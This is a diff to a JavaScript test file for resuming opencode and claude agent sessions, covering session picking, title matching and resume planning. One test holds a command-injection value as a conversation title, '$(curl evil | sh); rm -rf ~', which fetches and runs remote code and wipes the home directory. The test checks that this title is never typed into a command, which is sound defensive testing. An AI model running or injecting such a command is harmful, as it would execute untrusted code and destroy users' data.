@@ -20,7 +20,9 @@ import {
   newSessionId,
   opencodeTitleMatches,
   opencodeTitleOf,
+  opencodeTitlesAlike,
   pickOpencodeSession,
+  planOpencodeResume,
   resumeCertainty,
   resumeCommand,
   serializeAgent,
@@ -61,10 +63,14 @@ describe('Agent sessions: starting one, and starting it again', () => {
     assert.equal(agent.sessionId, null);
     assert.equal(resumeCommand(agent), 'opencode --continue');
 
-    // Which is a weaker promise, and the interface has to know that: two
-    // opencode terminals on one folder would both land on the same
-    // conversation, so nothing may claim it is "that" one.
-    assert.equal(resumeCertainty(agent), 'latest');
+    // Which is a weaker promise, and the interface has to know that. Typed
+    // blind, `--continue` put two opencode terminals on one folder in the
+    // same conversation — three of four, as reported on Windows — so it is
+    // only the record's own fallback now: the store looks the conversation
+    // up before it types anything (`planOpencodeResume`, AG-21, OR-20 on),
+    // and the offer promises a look-up, not "that one" and not "the most
+    // recent". A claude record with no id is still `latest` (AG-04).
+    assert.equal(resumeCertainty(agent), 'lookup');
     assert.equal(resumeCertainty(startCommand('claude').agent), 'exact');
   });
 
@@ -93,7 +99,7 @@ describe('Agent sessions: starting one, and starting it again', () => {
     const stored = serializeAgent({ ...agent, extra: 'dropped', sessionId: agent.sessionId });
 
     // `title`: the conversation's name, which opencode shows and the offer
-    // repeats — text only, never typed (see AG-20).
+    // repeats — text only, never typed (see AG-19).
     assert.deepEqual(Object.keys(stored).sort(), ['kind', 'sessionId', 'startedAt', 'title']);
     assert.equal(resumeCommand(stored), `claude --resume ${agent.sessionId}`);
     // A field of the wrong type is not carried into a command line.
@@ -325,7 +331,8 @@ describe('An agent typed by hand at the prompt', () => {
     for (const sessionId of hostile) {
       const raw = { kind: 'opencode', sessionId, startedAt: 1 };
       assert.equal(resumeCommand(raw), 'opencode --continue', JSON.stringify(sessionId));
-      assert.equal(resumeCertainty(raw), 'latest');
+      // No id it would type, so looked up at Resume (AG-03) — never typed.
+      assert.equal(resumeCertainty(raw), 'lookup');
       assert.equal(serializeAgent(raw).sessionId, null);
       assert.equal(isSessionIdFor('opencode', sessionId), false);
     }
@@ -412,5 +419,79 @@ describe('An agent typed by hand at the prompt', () => {
     assert.equal(stored.title, '$(curl evil | sh); rm -rf ~', 'kept as the text it is…');
     assert.equal(resumeCommand(stored), `opencode -s ${SES}`, '…and typed nowhere');
     assert.equal(serializeAgent({ kind: 'opencode', title: { toString: () => 'x' } }).title, null);
+  });
+  test('AG-20: a conversation another terminal has is never picked, and same-titled ones are never dealt out \u{2014} a terminal keeps the one it had', () => {
+    const A = 'ses_aaaaaaaaaaaaAAAAAAAAAAAAAA';
+    const B = 'ses_bbbbbbbbbbbbBBBBBBBBBBBBBB';
+    const C = 'ses_ccccccccccccCCCCCCCCCCCCCC';
+    // A is the oldest conversation but the one written to last.
+    const same = [
+      { id: A, title: 'Hello', created: 100, updated: 900 },
+      { id: B, title: 'Hello', created: 200, updated: 300 },
+      { id: C, title: 'Hello', created: 300, updated: 400 },
+      { id: 'ses_ddddddddddddOTHEROTHEROTH', title: 'Other', created: 999, updated: 999 },
+    ];
+    assert.equal(pickOpencodeSession(same, { title: 'Hello' }).id, A, 'alone: the most recently updated, as before');
+    assert.equal(pickOpencodeSession(same, { title: 'Hello', taken: new Set([A]) }).id, C, 'held elsewhere: never');
+    assert.equal(pickOpencodeSession(same, { title: 'Hello', taken: [A, B, C] }), null, 'all held: none, not another\u{2019}s');
+    assert.equal(
+      pickOpencodeSession(same, { title: 'Hello', currentId: B, taken: [B] }).id,
+      B,
+      'typed or resumed there: kept, though another terminal has it too'
+    );
+    // Two or more terminals that do not know theirs show "Hello": none is
+    // picked. A conversation is created at its first message, not when its
+    // agent starts, and an old one can be reopened: no order of times says
+    // which is whose, and a wrong guess would be typed as an exact id.
+    for (const contenders of [2, 3, 4]) {
+      assert.equal(pickOpencodeSession(same, { title: 'Hello', contenders }), null, `${contenders} terminals: dealt out`);
+    }
+    // Renamed alike, each still knows the id it had: kept.
+    assert.equal(pickOpencodeSession(same, { title: 'Hello', currentId: C, contenders: 2 }).id, C);
+    assert.equal(pickOpencodeSession(same, { title: 'Hello', currentId: 'ses_zzzzzzzzzzzzNOTLISTEDNOTLI', contenders: 2 }), null);
+
+    assert.equal(opencodeTitlesAlike('Hello', 'Hello'), true);
+    const long = 'Refactor the PTY output bus so hidden tabs keep their history';
+    assert.equal(opencodeTitlesAlike(`${long.slice(0, 37)}\u{2026}`, long), true, 'a cut and the whole');
+    assert.equal(opencodeTitlesAlike(long, `${long.slice(0, 37)}\u{2026}`), true);
+    assert.equal(opencodeTitlesAlike('Hello', 'Hello!'), false);
+    assert.equal(opencodeTitlesAlike(null, null), false, 'no title is no rival');
+  });
+
+  test('AG-21: Resume without an id types by id when the list says which, `--continue` only for the run\u{2019}s one opencode terminal, and asks otherwise', () => {
+    const A = 'ses_aaaaaaaaaaaaAAAAAAAAAAAAAA';
+    const B = 'ses_bbbbbbbbbbbbBBBBBBBBBBBBBB';
+    const C = 'ses_ccccccccccccCCCCCCCCCCCCCC';
+    const sessions = [
+      { id: A, title: 'Alpha', created: 1, updated: 10 },
+      { id: B, title: 'Beta', created: 2, updated: 20 },
+      { id: C, title: 'Gamma', created: 3, updated: 30 },
+      { id: 'ses_ddddddddddddALPHAALPHAALPH', title: 'Alpha', created: 4, updated: 5 },
+    ];
+    const plan = (input) => {
+      const out = planOpencodeResume({ sessions, ...input });
+      return out.session ? out.session.id : out;
+    };
+    const LATEST = { latest: true };
+    const ASK = { choose: 'unsure' };
+    // The list cannot be read: `--continue` alone, never with company.
+    assert.deepEqual(planOpencodeResume({ sessions: null, alone: true }), LATEST);
+    assert.deepEqual(planOpencodeResume({ sessions: null, alone: false }), { choose: 'unreadable' });
+    // By title, alone or not.
+    assert.equal(plan({ title: 'Beta', alone: false }), B);
+    assert.equal(plan({ title: 'Beta', alone: true }), B);
+    assert.equal(plan({ title: 'Alpha' }), A, 'of two that fit, the most recently updated');
+    assert.deepEqual(plan({ title: 'Beta', taken: [B] }), ASK, 'its title fits only another\u{2019}s: ask');
+    assert.deepEqual(plan({ title: 'Alpha', contenders: 2, alone: true }), ASK, 'another terminal shows it too: never dealt out');
+    assert.equal(plan({ title: 'Alpha', contenders: 2, hintId: 'ses_ddddddddddddALPHAALPHAALPH' }), 'ses_ddddddddddddALPHAALPHAALPH');
+    // Nothing to go on: no title, or one that fits nothing listed (a folder
+    // made a repository since, a conversation deleted) — the newest would be
+    // a guess at an old id. `--continue` alone, else ask.
+    for (const title of [null, 'Renamed since']) {
+      assert.deepEqual(plan({ title, alone: true }), LATEST, String(title));
+      assert.deepEqual(plan({ title, alone: false }), ASK, String(title));
+    }
+    assert.deepEqual(planOpencodeResume({ sessions: [], alone: true }), LATEST);
+    assert.deepEqual(planOpencodeResume({ sessions: [], alone: false }), ASK);
   });
 });
